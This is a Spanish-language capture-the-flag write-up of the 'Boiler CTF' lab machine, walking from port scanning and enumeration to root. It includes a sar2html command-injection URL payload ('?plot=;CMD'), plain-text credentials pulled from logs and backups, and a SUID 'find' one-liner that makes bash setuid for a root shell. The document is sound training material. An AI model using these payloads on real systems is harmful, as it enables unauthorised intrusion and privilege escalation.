# Boiler CTF
## Initial Scan
```
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enum
### FTP 
El login anonimo esta habilitado,veamos que hay dentro del ftp
```
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```
Leemos el archivo y:
```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
Aplicamos rot13 y:
```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```
### HTTP
#### Gobusting
```
/joomla (Status: 301)
/manual (Status: 301)
/robots.txt (Status: 200)
```
#### Robots.txt
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
Al ultimo string le aplicamos dec to ascii , y lueoo base64 -d y obtenemos algo que parece un hash
```
99b0660cd95adea327c54182baa51584
```
Lo crackeamos y sale kidding

#### Joomla
```
/images (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/templates (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/tests (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/installation (Status: 301)
/build (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
```
#### test
En este endpoint tenemos un servicio llamado sar2html en Searchsploit tenemos una vuln conocida
```
Sar2HTML 3.2.1 - Remote Command Execution                                                                        | php/webapps/47204.txt
```
Si la leemos vemos que con hacer lo siguiente:
```
http://IP/joomla/_test/index.php?plot=;CMD
```
Podemos ejecutar codigo sin problema, intentemos obtner shell gracias a esto
```
http://10.10.180.113/joomla/_test/index.php?plot=;ls
```
Viendo los archivos en el directorios vemos un log.txt, veamos que hay en el mismo
```
Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
```

## Privesc
### Stoner
Dentro de la carpeta de basterd tenemos un archivo de backup lo leemos y podemos ver las creds de stoner
```
USER=stoner
#superduperp@$$no1knows
```
Con esto podemos logearnos como stoner
### Root
```
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```
El archivo no existe :v, busquemos SUID:
```
/usr/bin/find
```
Coneste podemos escalar privilegios de manera sencilla
```
stoner@Vulnerable:~$ find / -name bash -exec chmod +s {} \; 2>/dev/null
stoner@Vulnerable:~$ /bin/bash -p
```
Y shell as root

# Analisís de la intrusion
### Vuln sar2html versio
La version usada de sar2html es vulnerable a RCE , cosa que aprovechamos para poder leer un log con las credenciales de un usuario
### Sensible data exposure 
Las creds de basterd quedaron expuestas gracias al RCE lo que nos permitio iniciar sesión via SSH en el usuario
### Hardcoded credentials
En el archivo backup.sh estan las credenciales de stoner en texto plano, con ella accedimos a stoner
### SUID activo en find
EL archivo para el comando find tiene el SUID activo lo que permitio elevar privilegios hasta root
